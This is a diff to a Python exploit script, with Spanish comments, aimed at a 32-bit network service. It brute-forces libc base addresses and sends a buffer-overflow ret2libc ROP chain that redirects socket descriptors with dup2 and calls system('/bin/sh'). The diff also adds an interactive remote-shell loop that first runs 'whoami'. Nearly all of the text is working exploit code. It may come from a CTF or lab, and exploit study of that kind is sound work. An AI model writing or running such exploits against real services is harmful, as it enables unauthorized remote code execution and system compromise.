@@ -9,6 +9,32 @@ PORT = 9999
 def generar_direcciones_libc(base_start= 0xf7c00000, base_end=0xf7e00000, page_size=0x1000):
     return [addr for addr in range(base_start, base_end, page_size)]
 
+def get_connection():
+   s=socket.socket()
+   s.connect((HOST,PORT))
+   return s
+
+def interact_shell(s):
+    sys.stdout.flush()
+    s.settimeout(0.5)
+    s.send("whoami\n".encode())
+    time.sleep(0.2)
+    sys.stdout.write(s.recv(4096).decode(errors='ignore'))
+    while True:
+        try:
+            sys.stdout.flush()
+            print("Prueba a mandar cositas")
+            c = input("$ -> ")
+            s.send((c + '\n').encode())
+            time.sleep(0.5)
+            sys.stdout.write(s.recv(4096).decode(errors='ignore'))
+        except socket.timeout:
+            continue
+        except KeyboardInterrupt as e:
+            print("quit")
+            s.close()
+            break
+
 def send_payload(payload_data: bytes, timeout: float = 2.0):
     """
     Send payload to target server and receive response.
@@ -17,7 +43,8 @@ def send_payload(payload_data: bytes, timeout: float = 2.0):
         timeout: Timeout in seconds for socket operations
     """
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(timeout)
+    if timeout > 0:
+        sock.settimeout(timeout)
     try:
         sock.connect((HOST, PORT))
         # Send payload
@@ -77,16 +104,17 @@ def byte_for_byte(offset,len_payload=8):
 
 offset = calcular_offset()
 print("[+] Brute forcing EBP and EBX")
-ebp = b"BBBBBBBB" #byte_for_byte(offset)
+ebp = b"BBBBBBBB" # byte_for_byte(offset)
 print(f"[+] EBX|EBP value is 0x {ebp.hex()}")
 
-libc = ELF("/usr/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
+libc = ELF("/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
 system_offset = libc.symbols["system"]
 exit_offset = libc.symbols["exit"]
 ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9  #  Te quedas con el "ls" de shells para ejecutar el comando
 binsh_offset = next(libc.search(b"/bin/sh")) # Te quedas con el "/bin/sh" de shells para ejecutar el comando
 dup2_offset = libc.symbols["dup2"]
-pop_ret_offset = 0x000238a3
+gadget1_offset = 0x0001a879
+gadget2_offset = 0x0007d34b
 print(f"system_offset: {hex(system_offset)}")
 print(f"exit_offset: {hex(exit_offset)}")
 print(f"command_offset: {hex(ls_command_offset)}")
@@ -99,25 +127,43 @@ for base in libc_base_guesses:
     system = struct.pack("<I", (base + system_offset))
     exit_addr = struct.pack("<I", (base + exit_offset))
     ls_cmd = struct.pack("<I", (base + ls_command_offset))
+    dup2_cmd = struct.pack("<I", (base + dup2_offset))
     binsh = struct.pack("<I", (base + binsh_offset))
-    pop_ret = struct.pack("<I", (base + pop_ret_offset))
+    gadget1 = struct.pack("<I",(base + gadget1_offset))
+    gadget2 = struct.pack("<I", (base +gadget2_offset ))
 
     # Payload para dos llamadas seguidas a system: primero 'ls', luego '/bin/sh'
     PAYLOAD = b"A" * offset
     PAYLOAD += ebp
-    PAYLOAD += system         # Dirección de retorno: system (primera llamada)
-    PAYLOAD += pop_ret         # Dirección de retorno: system (segunda llamada)
-    PAYLOAD += ls_cmd         # Argumento para la primera llamada ("ls")
-    PAYLOAD += system         # Dirección de retorno tras la segunda llamada (puede ser exit o system)
-    PAYLOAD += pop_ret      # Dirección de retorno tras la segunda llamada (exit)
-    PAYLOAD += ls_cmd          # Argumento para la segunda llamada ("/bin/sh")
+    # PAYLOAD += system
+    PAYLOAD += dup2_cmd
+    PAYLOAD += gadget2
+    PAYLOAD += p32(4)
+    PAYLOAD += p32(0)
+    PAYLOAD += dup2_cmd
+    PAYLOAD += gadget2
+    PAYLOAD += p32(4)
+    PAYLOAD += p32(1)
+    PAYLOAD += dup2_cmd
+    PAYLOAD += gadget2
+    PAYLOAD += p32(4)
+    PAYLOAD += p32(2)
     PAYLOAD += system
-    PAYLOAD += exit_addr
+    PAYLOAD += gadget1  # Dirección de retorno tras la primera llamada
+    PAYLOAD += ls_cmd
+    PAYLOAD += system
+    PAYLOAD += exit_addr  # Dirección de retorno tras la primera llamada
     PAYLOAD += binsh
-    # Dirección de retorno tras la segunda llamada (exit)
-    RESPONSE = send_payload(PAYLOAD)
 
-    if RESPONSE:
-        print(f"[+] GOT IT: base = {base}")
-    #time.sleep(0.1)
+    s = get_connection()
+    s.send(PAYLOAD)
+    response = s.recv(4096); # read banner
+    if response:
+        print("[+] Shell abierta, respuesta inicial:")
+        print(f"Respuesta: {response}")
+        interact_shell(s)
+        break;
+    else:
+        s.close()
+
 print("[+] Finished wihout success")
